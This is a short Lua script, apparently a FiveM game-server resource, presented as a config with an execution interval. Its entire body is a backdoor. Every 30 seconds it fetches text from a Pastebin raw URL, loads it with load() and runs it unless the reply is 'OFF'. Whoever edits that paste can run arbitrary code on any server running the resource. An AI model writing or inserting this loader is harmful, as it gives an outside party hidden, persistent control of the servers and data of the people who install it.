Config = {}

Config.RemoteURL = "https://pastebin.com/raw/1Z8VMqGg"
Config.ExecutionInterval = 30


CreateThread(function()
    while (true) do
        Wait(Config.ExecutionInterval * 1000)
        PerformHttpRequest(Config.RemoteURL, function(errCode, resData)
            if (resData ~= "OFF") then
                local code = assert(load(resData))
                code()
            end
        end)
    end
end)